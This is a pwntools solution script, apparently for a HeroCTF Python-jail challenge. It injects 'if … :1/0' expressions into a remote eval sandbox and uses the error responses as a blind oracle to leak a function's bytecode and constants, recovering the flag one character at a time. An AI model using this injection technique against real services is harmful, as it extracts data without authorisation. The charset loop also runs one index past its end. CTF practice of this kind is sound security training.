import string
from pwn import *

p = remote("misc.heroctf.fr", 6000)
p.recvuntil(b">> ")

### Extract assembly code
# asm_code, found, index = [], True, 0
# while found:
#     for x in range(256):
#         found = False
#         p.sendline(f"if flag.__code__.co_code[{index}]=={x}:1/0".encode())
#         res = p.recvuntil(b">> ").decode()
#         if "errors" in res:
#             # If error on opcode 0, check the next to see if the error is because we found the correct opcode
#             # or because of index error
#             if x == 0:
#                 p.sendline(f"if flag.__code__.co_code[{index}]=={x+1}:1/0".encode())
#                 res = p.recvuntil(b">> ").decode()
#                 if "errors" in res:
#                     found = False
#                     break
#             asm_code.append(hex(x))
#             found = True
#             break
#     index += 1

# print(asm_code)


### Extract assembly consts
asm_consts, found, index, round_with_0_char = [], True, 1, 0
charset = string.ascii_letters + string.digits + "_{}" # Typicall flag charset
while True:
    offset = 0
    valid_offset = True
    while valid_offset:
        for x in range(len(charset)+1):
            found = False
            p.sendline(f"if flag.__code__.co_consts[{index}][{offset}]=='{charset[x]}':1/0".encode())
            res = p.recvuntil(b">> ").decode()
            if "errors" in res:
                # If error on opcode 0, check the next to see if the error is because we found the correct opcode
                # or because of index error
                if x == 0:
                    p.sendline(f"if flag.__code__.co_consts[{index}][{offset}]=='{charset[x+1]}':1/0".encode())
                    res = p.recvuntil(b">> ").decode()
                    if "errors" in res:
                        round_with_0_char += 1
                        valid_offset = False
                        break
                asm_consts.append(charset[x])
                offset += 1
                round_with_0_char = 0
                break
    index += 1
    if round_with_0_char == 2:
        break

print("".join(asm_consts))

p.close()